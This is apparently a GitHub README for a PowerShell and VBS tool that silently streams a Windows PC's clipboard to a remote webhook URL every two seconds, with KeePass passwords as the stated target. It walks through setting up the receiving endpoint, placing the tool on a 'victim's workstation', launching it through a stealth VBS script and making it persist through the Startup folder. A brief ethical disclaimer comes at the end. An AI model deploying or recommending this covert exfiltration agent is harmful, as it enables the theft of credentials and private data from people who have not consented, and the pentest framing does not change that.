# GiveMeYourClipBoard
Cybersecurity: Keepass agent leak
GiveMeYourClipBoard is a project that streams the contents of a Windows PC's clipboard.
Now imagine you're conducting a pentest and want to retrieve all the data stored in a workstation's memory.
(Useful for passwords via KeePass, for example.)

How does it work?

Scans the clipboard contents
Sends each new content to a URL (yours, the one you want)
Runs in the background (every 2 seconds)
Easy to configure
And most importantly: remains invisible.

Project Structure

📁 GiveMeYourClipBoard/
├── yourhttp_server.txt <- contains your URL, your attacking web server
└── givemeyourclipboard.ps1 <- standalone PowerShell script
└── RUN.vbs <- VB script: Stealth Launcher

Let's Go!

1. Let's start by starting a web server that will accept responses. Any server will do as long as you can view the logs.
I don't want to use one of my servers for the attack, so I'll use a free webhook. Go to https://webhook.site/
This service will automatically generate a URL for you:
![image](https://github.com/user-attachments/assets/dc40c327-0ec0-4f1a-85df-3ebb7f31e0f0)

I will use this URL and copy it into the project's yourhttp_server.txt file
![image](https://github.com/user-attachments/assets/5a4aac05-c3da-4e6a-b32e-0d4c4b8458bc)
Your project is ready, now find a vector to copy the project to the victim's workstation(s).

2. On the victim's workstation, launch RUN.VBS (double-click).
3. Back at your headquarters, monitor the activity on your server interface.
4. During the day, your user will likely copy and paste credentials into memory, which you can retrieve live.

Example with KeePass
![image](https://github.com/user-attachments/assets/0653659d-7952-4948-aadd-07adc0c67ab9)
get the result !
![image](https://github.com/user-attachments/assets/5e47b1d2-1d49-44d1-8913-68ce8964fe8c)


To go further, you can launch everything automatically when Windows starts:
Place a shortcut to the .vbs file in:
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

You now have a persistent, silent agent that posts the clipboard to a remote server.

🔐 Ethical Warning
This type of script has the potential for malicious use. This project is strictly educational.
Any clipboard monitoring must be done with the user's explicit consent, within a legal and ethical framework (e.g., internal testing, training, lab environment, etc.).
